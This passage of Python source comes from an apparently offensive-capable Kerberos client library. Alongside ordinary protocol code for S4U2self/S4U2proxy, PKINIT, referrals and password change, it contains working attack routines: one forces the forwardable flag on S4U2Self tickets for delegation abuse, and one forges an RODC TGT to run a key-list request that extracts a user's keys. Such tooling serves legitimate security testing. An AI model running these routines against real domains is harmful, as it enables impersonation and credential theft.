		tgs = reply.native

		cipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
		encticket = tgs['ticket']['enc-part']['cipher']
		decdata = cipher.decrypt(self.kerberos_session_key, 2, encticket)
		decticket = EncTicketPart.load(decdata).native

		encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
		key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
		self.ccache.add_tgs(tgs, encTGSRepPart)
		logger.debug('[U2U] Got valid TGS reply')

		return tgs, encTGSRepPart, key, decticket
	
	#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6a8dfc0c-2d32-478a-929f-5f9b1b18a169
	async def S4U2self(self, user_to_impersonate, spn_user = None, kdcopts = ['forwardable','renewable','canonicalize'], is_dmsa = False):
		"""
		user_to_impersonate : KerberosTarget class
		"""
		
		if not self.kerberos_TGT:
			logger.debug('[S4U2self] TGT is not available! Fetching TGT...')
			await self.get_TGT()
		
		auth_package_name = 'Kerberos'
		now = self._now()
		
		
		###### Calculating authenticator data
		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
		authenticator_data['cname'] = self.kerberos_TGT['cname']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)

		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
		
		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
		
		
		pa_data_auth = {}
		pa_data_auth['padata-type'] = PaDataType.TGS_REQ.value
		pa_data_auth['padata-value'] = AP_REQ(ap_req).dump()

		nonce = secrets.randbits(31)

		if is_dmsa:
			from kerbad.protocol.asn1_structs import S4UUserID, PA_S4U_X509_USER, S4UUserIDOptions
			from kerbad.protocol.encryption import make_checksum, Cksumtype
			# [MS-SFU] 2.2.2 PA_S4U_X509_USER
			user_id = {}
			user_id['nonce'] = nonce
			user_id['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': user_to_impersonate.get_principalname()})
			user_id['crealm'] = user_to_impersonate.domain
			# Ensure the options set contains only valid and supported options
			user_id['options'] = S4UUserIDOptions(set(['signed-with-kun-27','unconditional-delegation']))
			for_x509_user = {}
			for_x509_user['user-id'] = S4UUserID(user_id)
			enctype_to_checksum = {
				Enctype.DES_MD5: Cksumtype.MD5_DES,
				Enctype.DES3: Cksumtype.SHA1_DES3,
				Enctype.AES128: Cksumtype.SHA1_AES128,
				Enctype.AES256: Cksumtype.SHA1_AES256,
				Enctype.RC4: Cksumtype.MD4,
				Enctype.RC4_MD4: Cksumtype.HMAC_MD5,
			}
			cksumtype = enctype_to_checksum[self.kerberos_cipher_type]
			chksum_data = make_checksum(cksumtype, self.kerberos_session_key, 26, for_x509_user['user-id'].dump())
			chksum = {}
			chksum['cksumtype'] = cksumtype
			chksum['checksum'] = chksum_data
			for_x509_user['checksum'] = Checksum(chksum)
			pa_for_user = {}
			pa_for_user['padata-type'] = int(PADATA_TYPE('FOR-X509-USER'))
			pa_for_user['padata-value'] = PA_S4U_X509_USER(for_x509_user).dump()
		else:
			###### Calculating checksum data
			
			S4UByteArray = NAME_TYPE.PRINCIPAL.value.to_bytes(4, 'little', signed = False)
			S4UByteArray += user_to_impersonate.username.encode()
			S4UByteArray += user_to_impersonate.domain.encode()
			S4UByteArray += auth_package_name.encode()
			
			chksum_data = _HMACMD5.checksum(self.kerberos_session_key, 17, S4UByteArray)
			
			
			chksum = {}
			chksum['cksumtype'] = int(CKSUMTYPE('HMAC_MD5'))
			chksum['checksum'] = chksum_data

			###### Filling out PA-FOR-USER data for impersonation
			pa_for_user_enc = {}
			pa_for_user_enc['userName'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': user_to_impersonate.get_principalname()})
			pa_for_user_enc['userRealm'] = user_to_impersonate.domain
			pa_for_user_enc['cksum'] = Checksum(chksum)
			pa_for_user_enc['auth-package'] = auth_package_name
			
			pa_for_user = {}
			pa_for_user['padata-type'] = int(PADATA_TYPE('PA-FOR-USER'))
			pa_for_user['padata-value'] = PA_FOR_USER_ENC(pa_for_user_enc).dump()
	
		###### Constructing body
		if spn_user is not None:
			if isinstance(spn_user, str):
				spn_user = [spn_user]
			elif isinstance(spn_user, list):
				spn_user = spn_user
			else:
				spn_user = spn_user.get_principalname()
		else:
			spn_user = self.credential.username.split('/')

		
		krb_tgs_body = {}
		krb_tgs_body['kdc-options'] = KDCOptions(set(kdcopts))
		krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.UNKNOWN.value, 'name-string': spn_user})
		krb_tgs_body['realm'] = self.credential.domain.upper()
		krb_tgs_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		krb_tgs_body['nonce'] = nonce
		krb_tgs_body['etype'] = [self.kerberos_session_key.enctype] #[supp_enc.value] #selecting according to server's preferences
		
		
		krb_tgs_req = {}
		krb_tgs_req['pvno'] = krb5_pvno
		krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
		krb_tgs_req['padata'] = [pa_data_auth, pa_for_user]
		krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)
		
		req = TGS_REQ(krb_tgs_req)
		
		logger.debug('[S4U2self] Sending request to server')
		
		reply = await self.ksoc.sendrecv(req.dump())
		if reply.name == 'KRB_ERROR':
			emsg = 'S4U2self failed!'
			if reply.native['error-code'] == 16:
				emsg = 'S4U2self: Failed to get S4U2self! Error code (16) indicates that delegation is not enabled for this account!'			
			raise KerberosError(reply, emsg)
		
		logger.debug('[S4U2self] Got reply, decrypting...')
		tgs = reply.native
		
		encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
		key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
		self.ccache.add_tgs(tgs, encTGSRepPart)
		logger.debug('[S4U2self] Got valid TGS reply')

		return tgs, encTGSRepPart, key
		
	# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c920c148-8a9c-42e9-b8e9-db5755cd281b
	async def S4U2proxy(self, s4uself_ticket, spn_user):
		logger.debug('[S4U2proxy] Impersonating %s' % '/'.join(spn_user.get_principalname()))
		now = self._now()
		
		pa_pac_opts = {}
		pa_pac_opts['padata-type'] = int(PADATA_TYPE('PA-PAC-OPTIONS'))
		pa_pac_opts['padata-value'] = PA_PAC_OPTIONS({'value' : PA_PAC_OPTIONSTypes(set(['resource-based constrained delegation']))}).dump()

		
		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
		authenticator_data['cname'] = self.kerberos_TGT['cname']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)
		
		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
		
		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
		
		pa_tgs_req = {}
		pa_tgs_req['padata-type'] = PaDataType.TGS_REQ.value
		pa_tgs_req['padata-value'] = AP_REQ(ap_req).dump()
		
		
		krb_tgs_body = {}
		#krb_tgs_body['kdc-options'] = KDCOptions(set(['forwardable','forwarded','renewable','renewable-ok', 'canonicalize']))
		krb_tgs_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','constrained-delegation', 'canonicalize']))
		krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': spn_user.get_principalname()})
		krb_tgs_body['realm'] = self.credential.domain.upper()
		krb_tgs_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		krb_tgs_body['nonce'] = secrets.randbits(31)
		krb_tgs_body['etype'] = [self.kerberos_session_key.enctype] #[supp_enc.value] #selecting according to server's preferences
		krb_tgs_body['additional-tickets'] = [s4uself_ticket]
		
		
		krb_tgs_req = {}
		krb_tgs_req['pvno'] = krb5_pvno
		krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
		krb_tgs_req['padata'] = [pa_tgs_req, pa_pac_opts]
		krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)
		
		req = TGS_REQ(krb_tgs_req)
		
		reply = await self.ksoc.sendrecv(req.dump())
		if reply.name == 'KRB_ERROR':
			emsg = 'S4U2proxy failed!'
			if reply.native['error-code'] == 16:
				emsg = 'S4U2proxy: Failed to get S4U2proxy! Error code (16) indicates that delegation is not enabled for this account!'
			
			raise KerberosError(reply, emsg)
		
		logger.debug('[S4U2proxy] Got server reply, decrypting...')
		tgs = reply.native
		
		encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
		key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
		
		self.ccache.add_tgs(tgs, encTGSRepPart)
		logger.debug('[S4U2proxy] Got valid TGS reply')

		return tgs, encTGSRepPart, key
		
	def construct_apreq(self, tgs, encTGSRepPart, sessionkey, flags = None, seq_number = 0, ap_opts = [], cb_data = None):
		return construct_apreq_from_tgs_tgt(
			tgs, 
			sessionkey, 
			self.kerberos_TGT, 
			flags = flags, 
			seq_number = seq_number, 
			ap_opts = ap_opts, 
			cb_data = cb_data,
			now=self._now()
		)
		
	def _force_s4u2self_ticket_forwardable(self, tgs):
		"""Force the ``forwardable`` flag on an S4U2Self ticket in place.

		Required for resource-based constrained delegation (RBCD) when the
		minting account lacks ``TrustedToAuthForDelegation`` (no protocol
		transition): the KDC then returns the S4U2Self ticket NON-forwardable and
		refuses the subsequent S4U2Proxy with KDC_ERR_BADOPTION. The S4U2Self
		ticket is encrypted with the account's OWN long-term key, so we decrypt it
		(key usage 2), set the forwardable flag in the EncTicketPart, and
		re-encrypt with the same key. Mirrors impacket ``getST.py``
		``-force-forwardable``. No-op when the ticket is already forwardable.

		Requires ``self.credential`` to hold the account's long-term secret
		(password / NT hash / AES key) and, for AES-from-password, ``self.server_salt``
		populated by a real ``get_TGT`` (the ETYPE-INFO2 salt probe).
		"""
		enc_part = tgs['ticket']['enc-part']
		etype = int(enc_part['etype'])
		# The S4U2Self ticket is encrypted with the requesting account's OWN
		# long-term key. Reuse the canonical EncTicketPart crypto primitive
		# (shared with raise_child_native's PAC injection). get_key_for_enctype
		# expects an EncryptionType enum, not the raw int from the ticket
		# (EncryptionType is a plain Enum, so a bare int matches no branch and
		# hits the 'etype.name' error path) — convert it like get_supported_enctypes does.
		key = Key(
			_enctype_table[etype].enctype,
			self.credential.get_key_for_enctype(EncryptionType(etype), salt=self.server_salt),
		)
		enc_ticket_part = decrypt_enc_ticket_part(enc_part, key)
		if not set_enc_ticket_part_flag(enc_ticket_part, 'forwardable'):
			logger.debug('[S4U2self] S4U2Self ticket already forwardable; no flip needed')
			return
		reencrypt_enc_ticket_part(enc_part, key, enc_ticket_part)
		logger.debug('[S4U2self] Forced forwardable flag on S4U2Self ticket (RBCD, no T2A4D)')

	async def getST(self, target_user, service_spn, force_forwardable = False):
		tgs, encTGSRepPart, key  = await self.S4U2self(target_user)
		if force_forwardable:
			# RBCD: the account has no TrustedToAuthForDelegation, so the S4U2Self
			# ticket comes back non-forwardable and S4U2Proxy would be refused
			# (KDC_ERR_BADOPTION). Force the flag using the account's own key.
			self._force_s4u2self_ticket_forwardable(tgs)
		return await self.S4U2proxy(tgs['ticket'], service_spn)


	def decrypt_asrep_cert(self, as_rep):
		
		def truncate_key(value, keysize):
			output = b''
			currentNum = 0
			while len(output) < keysize:
				currentDigest = hashlib.sha1(bytes([currentNum]) + value).digest()
				if len(output) + len(currentDigest) > keysize:
					output += currentDigest[:keysize - len(output)]
					break
				output += currentDigest
				currentNum += 1
			
			return output

		for pa in as_rep['padata']:
			if pa['padata-type'] == 17:
				pkasrep = PA_PK_AS_REP.load(pa['padata-value']).native
				break
		else:
			raise Exception('PA_PK_AS_REP not found!')

		try:
			sd = cms.SignedData.load(pkasrep['dhSignedData']).native
		except:
			sd = cms.SignedData.load(pkasrep['dhSignedData'][19:]).native # !!!!!!!!!!!!! TODO: CHECKTHIS!!! Sometimes there is an OID before the struct?!
	
		keyinfo = sd['encap_content_info']
		if keyinfo['content_type'] != '1.3.6.1.5.2.3.2':
			raise Exception('Keyinfo content type unexpected value')
		authdata = KDCDHKeyInfo.load(keyinfo['content']).native
		pubkey = int(''.join(['1'] + [str(x) for x in authdata['subjectPublicKey']]), 2)		

		pubkey = int.from_bytes(core.BitString(authdata['subjectPublicKey']).dump()[7:], 'big', signed = False) # !!!!!!!!!!!!! TODO: CHECKTHIS!!!
		shared_key = self.credential.dhparams.exchange(pubkey)
		
		server_nonce = pkasrep['serverDHNonce']
		fullKey = shared_key + self.credential.dhparams.dh_nonce + server_nonce

		etype = as_rep['enc-part']['etype']
		cipher = _enctype_table[etype]
		if etype == Enctype.AES256:
			self.pkinit_tkey = truncate_key(fullKey, 32)
		elif etype == Enctype.AES128:
			self.pkinit_tkey = truncate_key(fullKey, 16)
		elif etype == Enctype.RC4:
			raise NotImplementedError('RC4 key truncation documentation missing. it is different from AES')
			#self.pkinit_tkey = truncate_key(fullKey, 16)
		

		key = Key(cipher.enctype, self.pkinit_tkey)
		enc_data = as_rep['enc-part']['cipher']
		dec_data = cipher.decrypt(key, 3, enc_data)
		encasrep = EncASRepPart.load(dec_data).native
		cipher = _enctype_table[ int(encasrep['key']['keytype'])]
		session_key = Key(cipher.enctype, encasrep['key']['keyvalue'])
		return encasrep, session_key, cipher
	
	async def get_referral_ticket(self, target_domain, target_ip = None, prev_sname = None):
		"""Cross domain TGT referral"""
		"""If target_ip is not set, the target domain will be used as the hostname for the newly created connection"""
		from kerbad.common.factory import KerberosClientFactory
		from kerbad.common.kirbi import Kirbi

		crossrealm_spn = KerberosSPN()
		crossrealm_spn.username = target_domain
		crossrealm_spn.service = 'krbtgt'
		crossrealm_spn.domain = self.credential.domain.upper()

		await self.get_TGT()
		logger.debug('Getting TGS for otherdomain krbtgt')
		tgs, encpart, key = await self.get_TGS(crossrealm_spn)
		logger.debug('Got referral ticket!')

		for _ in range(10): # 10 is arbitrary, but I fail to imagine a scenario where we would need more than 10 referrals
			# Bounds-check the referral sname. A cross-realm referral TGS is
			# expected to carry sname = ['krbtgt', '<NEXT-REALM>'] so index [1] is
			# the next realm to chase. A malformed / wrong-realm reply (e.g. the
			# KDC returned a ticket for the wrong realm, which happens when the
			# request hit the WRONG KDC) can have fewer than 2 name-string
			# components. Accessing [1] then raised IndexError that escaped this
			# function uncaught (the try/except below only wraps the recursive
			# call). Surface a descriptive error instead so the failure reads as a
			# Kerberos realm mismatch rather than an opaque IndexError.
			name_string = encpart['sname']['name-string']
			if name_string is None or len(name_string) < 2:
				raise Exception(
					'Malformed cross-realm referral: sname name-string has '
					'%d component(s), expected >= 2 (krbtgt/<realm>). This usually '
					'means the referral TGS came from the WRONG KDC for the target '
					'realm (realm mismatch). Got name-string=%r' % (
						0 if name_string is None else len(name_string),
						name_string,
					)
				)
			sname = name_string[1].upper()
			if prev_sname == sname:
				# the original domain name was not canonical but we got the same krbtgt, so we can use this ticket
				break
			
			prev_sname = sname
			if sname == target_domain.upper():
				break

			# otherwise we have to do this again with the new krbtgt
			logger.debug('The referral ticket is not for the target domain, getting new referral ticket from %s' % sname)
			
			kirbi = Kirbi.from_ticketdata(tgs, encpart)
			newt = self.target.get_newtarget(sname, port=88)
			newc = KerberosCredential.from_kirbi(kirbi, encoding='kirbi')
			try:
				new_factory = KerberosClientFactory(newt, newc, newt.proxies)
				newclient = new_factory.get_client()
				tgs, encpart, key, new_factory = await newclient.get_referral_ticket(target_domain, target_ip, prev_sname)
			except Exception as e:
				# wrapping it here in an exception so that the domain name information can be propagated up
				raise Exception('Failed to get referral ticket from domain "%s"! Reason: %s' % (sname, str(e)))

		kirbi = Kirbi.from_ticketdata(tgs, encpart)
		target_addr = target_domain
		if target_ip is not None:
			target_addr = target_ip
		newt = self.target.get_newtarget(target_addr, port=88)
		newc = KerberosCredential.from_kirbi(kirbi, encoding='kirbi')
		new_factory = KerberosClientFactory(newt, newc, newt.proxies)

		return tgs, encpart, key, new_factory
	
	async def change_password(self, new_password:str, subkey = None, targetuser:str = None, targetrealm:str = None, hostname:str ='localhost') -> KRB5CHPWReply:
		"""
		Changes the password of the current user
		"""
		if not self.kerberos_TGT:
			logger.debug('[ChangePassword] TGT is not available! Fetching TGT...')
			await self.get_TGT()
		
		if subkey is None:
			subkeydata = os.urandom(self.kerberos_cipher.keysize)
			subkey = Key(self.kerberos_cipher.enctype, subkeydata)

		now = self._now()

		###### Encrypting the new password
		#enc_data = self.kerberos_cipher.encrypt(subkey, 5, new_password.encode(), None)
		subkey_struct = EncryptionKey({'keytype': subkey.enctype, 'keyvalue': subkeydata})
		subkey_cipher = _enctype_table[subkey.enctype]

		changepwstruct = {}
		changepwstruct['newpasswd'] = new_password.encode()

		if targetuser is not None:
			if targetuser.find('@') != -1:
				targetuser, targetrealm = targetuser.split('@')
			changepwstruct['targname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [targetuser]})
			changepwstruct['targrealm'] = targetrealm if targetrealm is not None else self.credential.domain.upper()
		else:
			changepwstruct['targname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [self.credential.username]})
			changepwstruct['targrealm'] = self.credential.domain.upper()

		privstruct = {}
		privstruct['user-data'] = ChangePasswdDataMS(changepwstruct).dump()
		privstruct['seq-number'] = 0
		privstruct['s-address'] = HostAddress({'addr-type': 1, 'address': hostname.encode()})

		privdata = KRB_PRIV({
			'pvno': krb5_pvno,
			'msg-type': MESSAGE_TYPE.KRB_PRIV.value,
			'enc-part': EncryptedData({'etype': subkey.enctype, 'cipher': subkey_cipher.encrypt(subkey, 13, EncKrbPrivPart(privstruct).dump(), None)})
		}).dump()
		
		###### Calculating authenticator data
		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
		authenticator_data['cname'] = self.kerberos_TGT['cname']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)
		authenticator_data['seq-number'] = 0
		authenticator_data['subkey'] = subkey_struct
		
		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 11, Authenticator(authenticator_data).dump(), None)
		
		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
		
		ap_req_encoded = AP_REQ(ap_req).dump()
		
		
		message = KRB5ChangePassword(ap_req_encoded, privdata).to_bytes()
		logger.debug('[ChangePassword] Sending request to server')

		newt = self.target.get_newtarget(self.target.get_hostname_or_ip(), port=464)
		ksocket = AIOKerberosPWChangeClientSocket(newt)
		response = await ksocket.sendrecv(message)
		reply = KRB5ChangePassword.from_bytes(response)
		privresponse = reply.parse_reply(subkey_cipher, subkey)
		return privresponse

	# Handle clock skew explicitly, rather than relying on transparent error handling
	# silent failures can introduce hard-to-debug issues later in the Kerberos authentication flow of the parent process
	async def with_clock_skew(self, func, *args, **kwargs):
		"""
		Calls the given function with arguments. If a KerberosError with KRB_AP_ERR_SKEW is raised,
		computes the clock skew, sets self.clock_skew, and retries the function once.
		Usage: client.with_clock_skew(client.get_TGS, spn)
		"""
		try:
			return await func(*args, **kwargs)
		except KerberosError as e:
			if getattr(e, 'errorcode', None) == KerberosErrorCode.KRB_AP_ERR_SKEW:
				server_time = e.krb_err_msg['stime']
				local_time = datetime.datetime.now(datetime.timezone.utc)
				self.clock_skew = server_time - local_time
				logger.warning(f"Clock skew detected. Adjusting local time by {self.clock_skew}. Retrying operation.")
				return await func(*args, **kwargs)
			raise
		
	async def keylist(self, targetuser:str, targetrealm:str = None, prebuilt_ticket=None, prebuilt_sessionkey=None):
		"""
		To be used with an RODC krbtgt_##### account.
		This function creates and sends a TGS request to the KDC service, posing as the krbtgt_##### account and requests the keylist of the target user.

		When ``prebuilt_ticket`` and ``prebuilt_sessionkey`` are provided, the
		caller-supplied TGT (typically a fully-PAC'd RODC golden ticket loaded
		from a ccache) is reused for the AP-REQ instead of forging a partial
		TGT inline.  Modern writable DCs require a valid PAC on RODC-issued
		tickets; without it they return ``KDC_ERR_TGT_REVOKED`` regardless of
		the configured PRP.  ``prebuilt_ticket`` must be a ``Ticket`` ASN.1
		structure (or its native dict form) and ``prebuilt_sessionkey`` must
		be the session key dict (``{'keytype': int, 'keyvalue': bytes}``)
		stored alongside that ticket.
		"""

		parts = self.credential.username.split('_')
		if len(parts) == 2:
			kdcnum = int(parts[1])
		else:
			kdcnum = 0

		# first we must find the key type used for the krbtgt account
		# we prefer AES256, then AES128, then RC4
		krbtgt_enctype = self.credential.get_preferred_enctype(
			[
				EncryptionType.AES256_CTS_HMAC_SHA1_96,
				EncryptionType.AES128_CTS_HMAC_SHA1_96,
				EncryptionType.ARCFOUR_HMAC_MD5
			]
		)
		if krbtgt_enctype is None:
			raise ValueError('No preferred enctype found for krbtgt account!')


		krbtgt_key_data = self.credential.get_key_for_enctype(krbtgt_enctype)
		krbtgt_key = Key(krbtgt_enctype.value, krbtgt_key_data)
		krbtgt_cipher = _enctype_table[krbtgt_enctype.value]

		# When a pre-built ticket is provided we reuse its session key; the
		# DC will validate the AP-REQ authenticator against this key.  When
		# not provided, fall back to forging a partial TGT inline (legacy
		# behavior — does not include a PAC and may be rejected by hardened
		# writable DCs).
		if prebuilt_sessionkey is not None:
			sessionkey_enctype = EncryptionType(prebuilt_sessionkey['keytype'])
			sessionkey_data = prebuilt_sessionkey['keyvalue']
			sessionkey = Key(sessionkey_enctype.value, sessionkey_data)
		else:
			sessionkey_data = os.urandom(32) # 32 bytes for AES256
			sessionkey_enctype = EncryptionType.AES256_CTS_HMAC_SHA1_96
			sessionkey = Key(sessionkey_enctype.value, sessionkey_data)

		#create encticket, continaing session key
		encticket_key = EncryptionKey(
			{
				'keytype': sessionkey_enctype.value,
				'keyvalue': sessionkey_data
			}
		)

		now = datetime.datetime.now(datetime.timezone.utc)

		encticket = {}
		# NOTE: Microsoft's Rubeus uses 'forwardable' (TGT can be forwarded) here,
		# not 'forwarded' (TGT has already been forwarded).  The latter is
		# semantically wrong for a freshly-forged TGT and at least some writable
		# DCs reject the resulting TGS-REQ with KDC_ERR_TGT_REVOKED when the
		# Key List is requested.  Match Rubeus's flag set to match observed
		# behavior in the field.
		encticket['flags'] = TicketFlags(set(['forwardable', 'renewable', 'enc-pa-rep']))
		encticket['key'] = encticket_key
		encticket['crealm'] = targetrealm if targetrealm is not None else self.credential.domain.upper()
		encticket['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [targetuser]})
		encticket['transited'] = TransitedEncoding({'tr-type': 0, 'contents': b''})
		encticket['authtime'] = now.replace(microsecond=0)
		encticket['starttime'] = now.replace(microsecond=0)
		endtime = now + datetime.timedelta(days=100)
		encticket['endtime'] = endtime
		encticket['renew-till'] = endtime

		encticket = EncTicketPart(encticket)
		# When a pre-built ticket is provided we skip the inline encryption
		# entirely and reuse the caller's Ticket structure as-is.  Otherwise
		# we encrypt the just-constructed EncTicketPart with the krbtgt_<RID>
		# key, producing a partial TGT (no PAC).
		if prebuilt_ticket is not None:
			# Accept either an already-built Ticket ASN.1 object or its native
			# dict representation (e.g. from CCACHE.get_tgt's tgt_rep).
			if isinstance(prebuilt_ticket, dict):
				ticket_asn1 = Ticket(prebuilt_ticket)
			else:
				ticket_asn1 = prebuilt_ticket
			ticket_realm = str(ticket_asn1.native.get('realm') or self.credential.domain.upper())
			ticket_sname = ticket_asn1.native.get('sname')
		else:
			encticket_enc = krbtgt_cipher.encrypt(krbtgt_key, 2, encticket.dump(), None)

			partial_tgt_data = {}
			partial_tgt_data['pvno'] = krb5_pvno
			partial_tgt_data['realm'] = self.credential.domain.upper()
			partial_tgt_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
			partial_tgt_data['msg-type'] = MESSAGE_TYPE.KRB_TGS_REP.value
			partial_tgt_data['enc-part'] = EncryptedData(
				{
					'kvno': kdcnum << 16,
					'etype': krbtgt_enctype.value,
					'cipher': encticket_enc
				}
			)
			ticket_asn1 = Ticket({
				'tkt-vno': krb5_pvno,
				'realm': partial_tgt_data['realm'],
				'sname': partial_tgt_data['sname'],
				'enc-part': partial_tgt_data['enc-part']
				}
			)
			ticket_realm = partial_tgt_data['realm']
			ticket_sname = partial_tgt_data['sname']

		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = encticket['crealm']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)
		authenticator_data['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [targetuser]})
		authenticator = Authenticator(authenticator_data)

		cipher = _enctype_table[sessionkey_enctype.value]
		enc_authenticator = cipher.encrypt(sessionkey, 7, authenticator.dump(), None)

		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['authenticator'] = EncryptedData({'etype': sessionkey_enctype.value, 'cipher': enc_authenticator})
		ap_req['ticket'] = ticket_asn1

		pa_data_1 = {}
		pa_data_1['padata-type'] = PaDataType.TGS_REQ.value
		pa_data_1['padata-value'] = AP_REQ(ap_req).dump()

		pa_data_2 = {}
		pa_data_2['padata-type'] = PaDataType.KEY_LIST_REQ.value
		#pa_data_2['padata-value'] = KERB_KEY_LIST_REQ([23, 17, 18]).dump()
		pa_data_2['padata-value'] = KERB_KEY_LIST_REQ([
			EncryptionType.AES256_CTS_HMAC_SHA1_96.value,
			EncryptionType.AES128_CTS_HMAC_SHA1_96.value,
			EncryptionType.ARCFOUR_HMAC_MD5.value,
			EncryptionType.DES_CBC_CRC.value,
			EncryptionType.DES_CBC_MD5.value,
		
		]).dump()


		tgs_body_data = {}
		tgs_body_data['kdc-options'] = KDCOptions(set(['canonicalize']))
		tgs_body_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
		tgs_body_data['realm'] = ticket_realm
		tgs_body_data['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		tgs_body_data['nonce'] = secrets.randbits(31)
		#tgs_body_data['etype'] = [23, 17, 18, -128]
		tgs_body_data['etype'] = [
			EncryptionType.AES256_CTS_HMAC_SHA1_96.value,
			EncryptionType.AES128_CTS_HMAC_SHA1_96.value,
			EncryptionType.ARCFOUR_HMAC_MD5.value,
			EncryptionType.DES_CBC_CRC.value,
			EncryptionType.DES_CBC_MD5.value,
		]

		tgs_req_data = {}
		tgs_req_data['pvno'] = krb5_pvno
		tgs_req_data['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
		tgs_req_data['padata'] = [pa_data_1, pa_data_2]
		tgs_req_data['req-body'] = KDC_REQ_BODY(tgs_body_data)

		tgs_req = TGS_REQ(tgs_req_data)

		logger.debug('[KeylistPartial] Sending request to server')
		reply = await self.ksoc.sendrecv(tgs_req.dump())
		if reply.name == 'KRB_ERROR':
			raise KerberosError(reply, 'KeylistPartial failed!')
		logger.debug('[KeylistPartial] Got TGS reply, decrypting...')		
		tgs = reply.native
		
		cipher = _enctype_table[int(tgs['enc-part']['etype'])]
		encTGSRepPart = EncTGSRepPart.load(cipher.decrypt(sessionkey, 8, tgs['enc-part']['cipher'])).native		
		self.ccache.add_tgs(tgs, encTGSRepPart)
		logger.debug('[KeylistPartial] Got valid TGS reply')
		return tgs, encTGSRepPart, sessionkey
		
		
